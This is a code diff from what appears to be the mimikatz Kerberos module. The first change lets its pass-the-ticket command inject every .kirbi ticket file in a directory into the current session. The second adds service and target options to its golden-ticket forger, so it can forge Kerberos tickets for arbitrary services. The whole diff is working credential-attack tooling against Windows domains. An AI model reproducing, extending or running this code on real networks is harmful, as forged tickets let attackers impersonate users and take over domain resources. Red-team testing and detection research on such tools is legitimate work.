@@ -54,20 +54,74 @@ NTSTATUS LsaCallKerberosPackage(PVOID ProtocolSubmitBuffer, ULONG SubmitBufferLe
 
 NTSTATUS kuhl_m_kerberos_ptt(int argc, wchar_t * argv[])
 {
+	HANDLE hFind;
+	BOOL bFind = TRUE;
+	WIN32_FIND_DATA fData;
+	DWORD dwAttrib;
+	wchar_t fullpath[0xffff];
+	int i, j;
+
+	for(i = 0; i < argc; i++)
+	{
+		dwAttrib = GetFileAttributes(argv[i]);
+		if((dwAttrib != INVALID_FILE_ATTRIBUTES) && (dwAttrib & FILE_ATTRIBUTE_DIRECTORY))
+		{
+			kprintf(L"%3u - Directory \'%s\' (*.kirbi)\n", i, argv[i]);
+			if(wcscpy_s(fullpath, ARRAYSIZE(fullpath), argv[i]) == 0)
+			{
+				if(wcscat_s(fullpath, ARRAYSIZE(fullpath), L"\\*.kirbi") == 0)
+				{
+					hFind = FindFirstFile(fullpath, &fData);
+					if(hFind != INVALID_HANDLE_VALUE)
+					{
+						j = 0;
+						do
+						{
+							if(!(fData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
+							{
+								if(wcscpy_s(fullpath, ARRAYSIZE(fullpath), argv[i]) == 0)
+								{
+									if(wcscat_s(fullpath, ARRAYSIZE(fullpath), L"\\") == 0)
+									{
+										if(wcscat_s(fullpath, ARRAYSIZE(fullpath), fData.cFileName) == 0)
+										{
+											kprintf(L"   %3u - File \'%s\' : ", j, fData.cFileName);
+											kuhl_m_kerberos_ptt_file(fullpath);
+										}
+									}
+								}
+							}
+							j++;
+						} while(bFind = FindNextFile(hFind, &fData));
+						FindClose(hFind);
+					}
+				}
+			}
+		}
+		else
+		{
+			kprintf(L"%3u - File \'%s\' : ", i, argv[i]);
+			kuhl_m_kerberos_ptt_file(argv[i]);
+		}
+	}
+	return STATUS_SUCCESS;
+}
+
+void kuhl_m_kerberos_ptt_file(PCWCHAR filename)
+{
 	PBYTE fileData;
 	DWORD fileSize;
-
-	if(argc)
+	NTSTATUS status;
+	if(kull_m_file_readData(filename, &fileData, &fileSize))
 	{
-		if(kull_m_file_readData(argv[argc - 1], &fileData, &fileSize))
-		{
-			if(NT_SUCCESS(kuhl_m_kerberos_ptt_data(fileData, fileSize)))
-				kprintf(L"Ticket \'%s\' successfully submitted for current session\n", argv[0]);
-			LocalFree(fileData);
-		}
-		else PRINT_ERROR_AUTO(L"kull_m_file_readData");
-	} else PRINT_ERROR(L"Missing argument : ticket filename\n");
-	return STATUS_SUCCESS;
+		status = kuhl_m_kerberos_ptt_data(fileData, fileSize);
+		if(NT_SUCCESS(status))
+			kprintf(L"OK\n");
+		else
+			PRINT_ERROR(L"LsaCallKerberosPackage %08x\n", status);
+		LocalFree(fileData);
+	}
+	else PRINT_ERROR_AUTO(L"kull_m_file_readData");
 }
 
 NTSTATUS kuhl_m_kerberos_ptt_data(PVOID data, DWORD dataSize)
@@ -258,7 +312,7 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 {
 	BYTE key[AES_256_KEY_LENGTH] = {0};
 	DWORD i, j, nbGroups, id = 500, keyType, keyLen, App_KrbCredSize;
-	PCWCHAR szUser, szDomain, szSid, szKey, szId, szGroups, szLifetime, base, filename;
+	PCWCHAR szUser, szDomain, szService = NULL, szTarget = NULL, szSid, szKey, szId, szGroups, szLifetime, base, filename;
 	PISID pSid;
 	PGROUP_MEMBERSHIP dynGroups = NULL, groups;
 	PDIRTY_ASN1_SEQUENCE_EASY App_KrbCred;
@@ -309,6 +363,9 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 					
 					if(szKey)
 					{
+						kull_m_string_args_byName(argc, argv, L"service", &szService, NULL);
+						kull_m_string_args_byName(argc, argv, L"target", &szTarget, NULL);
+						
 						if(kull_m_string_args_byName(argc, argv, L"id", &szId, NULL))
 							id = wcstoul(szId, NULL, 0);
 
@@ -363,9 +420,12 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 							kprintf(L"Groups Id : *");
 							for(i = 0; i < nbGroups; i++)
 								kprintf(L"%u ", groups[i]);
-							kprintf(L"\nkrbtgt    : ");
-								
+							kprintf(L"\nServiceKey: ");
 							kull_m_string_wprintf_hex(key, keyLen, 0); kprintf(L" - %s\n", kuhl_m_kerberos_ticket_etype(keyType));
+							if(szService)
+								kprintf(L"Service   : %s\n", szService);
+							if(szTarget)
+								kprintf(L"Target    : %s\n", szTarget);
 							kprintf(L"Lifetime  : ");
 								kull_m_string_displayLocalFileTime(&lifeTimeData.TicketStart); kprintf(L" ; ");
 								kull_m_string_displayLocalFileTime(&lifeTimeData.TicketEnd); kprintf(L" ; ");
@@ -373,7 +433,7 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 							
 							kprintf(L"-> Ticket : %s\n\n", isPtt ? L"** Pass The Ticket **" : filename);
 
-							if(App_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, &lifeTimeData, pSid, key, keyLen, keyType, id, groups, nbGroups))
+							if(App_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, szService, szTarget, &lifeTimeData, pSid, key, keyLen, keyType, id, groups, nbGroups))
 							{
 								App_KrbCredSize = kull_m_asn1_getSize(App_KrbCred);
 								if(isPtt)
@@ -434,7 +494,7 @@ NTSTATUS kuhl_m_kerberos_encrypt(ULONG eType, ULONG keyUsage, LPCVOID key, DWORD
 	return status;
 }
 
-PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, PKUHL_M_KERBEROS_LIFETIME_DATA lifetime, PISID sid, LPCBYTE key, DWORD keySize, DWORD keyType, DWORD userid, PGROUP_MEMBERSHIP groups, DWORD cbGroups)
+PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, LPCWSTR servicename, LPCWSTR targetname, PKUHL_M_KERBEROS_LIFETIME_DATA lifetime, PISID sid, LPCBYTE key, DWORD keySize, DWORD keyType, DWORD userid, PGROUP_MEMBERSHIP groups, DWORD cbGroups)
 {
 	NTSTATUS status;
 	PDIRTY_ASN1_SEQUENCE_EASY App_EncTicketPart, App_KrbCred = NULL;
@@ -453,12 +513,14 @@ PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR 
 	{
 		ticket.ServiceName->NameCount = 2;
 		ticket.ServiceName->NameType = KRB_NT_SRV_INST;
-		RtlInitUnicodeString(&ticket.ServiceName->Names[0],	L"krbtgt");
-		RtlInitUnicodeString(&ticket.ServiceName->Names[1], domainname);
+		RtlInitUnicodeString(&ticket.ServiceName->Names[0],	servicename ? servicename : L"krbtgt");
+		RtlInitUnicodeString(&ticket.ServiceName->Names[1], targetname ? targetname : domainname);
 	}
-	ticket.DomainName = ticket.TargetDomainName = ticket.AltTargetDomainName = ticket.ServiceName->Names[1];
+	
+	RtlInitUnicodeString(&ticket.DomainName, domainname);
+	ticket.TargetDomainName = ticket.AltTargetDomainName = ticket.DomainName;
 
-	ticket.TicketFlags = KERB_TICKET_FLAGS_initial | KERB_TICKET_FLAGS_pre_authent | KERB_TICKET_FLAGS_renewable | KERB_TICKET_FLAGS_forwardable;
+	ticket.TicketFlags = (servicename ? 0 : KERB_TICKET_FLAGS_initial) | KERB_TICKET_FLAGS_pre_authent | KERB_TICKET_FLAGS_renewable | KERB_TICKET_FLAGS_forwardable;
 	ticket.TicketKvno = 2; // windows does not care about it...
 	ticket.TicketEncType = ticket.KeyType = keyType;
 	ticket.Key.Length = keySize;
@@ -542,7 +604,6 @@ NTSTATUS kuhl_m_kerberos_decode(int argc, wchar_t * argv[])
 	PBYTE encData, decData;
 	DWORD keyType, keyLen, encSize, decSize, offset = 0, size = 0;
 
-
 	if(kull_m_string_args_byName(argc, argv, L"rc4", &szKey, NULL))
 	{
 		keyType = KERB_ETYPE_RC4_HMAC_NT;
@@ -565,12 +626,9 @@ NTSTATUS kuhl_m_kerberos_decode(int argc, wchar_t * argv[])
 		if(kull_m_string_args_byName(argc, argv, L"in", &szIn, NULL))
 		{
 			kull_m_string_args_byName(argc, argv, L"out", &szOut, L"out.kirbi");
-			kull_m_string_args_byName(argc, argv, L"offset", &szOffset, NULL);
-			kull_m_string_args_byName(argc, argv, L"size", &szSize, NULL);
-
 			if(kull_m_file_readData(szIn, &encData, &encSize))
 			{
-				if(szOffset && szSize)
+				if(kull_m_string_args_byName(argc, argv, L"offset", &szOffset, NULL) && kull_m_string_args_byName(argc, argv, L"size", &szSize, NULL))
 				{
 					offset = wcstoul(szOffset, NULL, 0);
 					size = wcstoul(szSize, NULL, 0);
